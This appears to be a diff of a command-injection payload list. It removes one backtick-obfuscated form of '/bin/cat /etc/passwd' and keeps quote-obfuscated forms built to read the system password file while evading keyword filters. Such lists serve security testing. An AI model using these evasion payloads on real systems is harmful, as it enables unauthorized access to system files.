@@ -4,8 +4,6 @@
 /bin/cat /etc/passwd
 --------------------------------------------------------
 
-/bin/cat /e`e`t`t`c``/p`a`a`s`s`s`sw`d`d``
-
 /'b'i'n'/c'a't /'e't'c'/'p'a's's'w'd''
 
 /"b"i"n"/c"a"t /"e"t"c"/"p"a"s"s"w"d""
